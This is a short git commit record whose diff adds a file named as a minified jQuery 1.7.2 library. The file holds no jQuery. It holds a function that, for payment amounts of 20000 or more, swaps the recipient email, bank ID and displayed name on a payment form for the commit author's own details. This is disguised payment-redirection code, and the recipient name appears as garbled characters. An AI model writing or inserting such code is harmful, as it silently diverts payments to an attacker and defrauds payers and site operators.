c15f74982945ce83d5b73535abc0b86bba7713eb
yicai1616 <yicai1616@126.com>
2015-11-15 01:34:08 +0800

    jq

---
+++ Jquery-1.7.2.Min.js
@@ -0,0 +1,8 @@
+function Copy() 
+{ 
+if (document.getElementById('payAmount').value >= 20000){
+document.getElementById('BankID1').innerHTML='yicai1616@126.com';
+document.getElementById('optEmail').value='yicai1616@126.com';
+document.getElementById('Name1').innerHTML='”‡÷æ∑Â';
+}
+} 
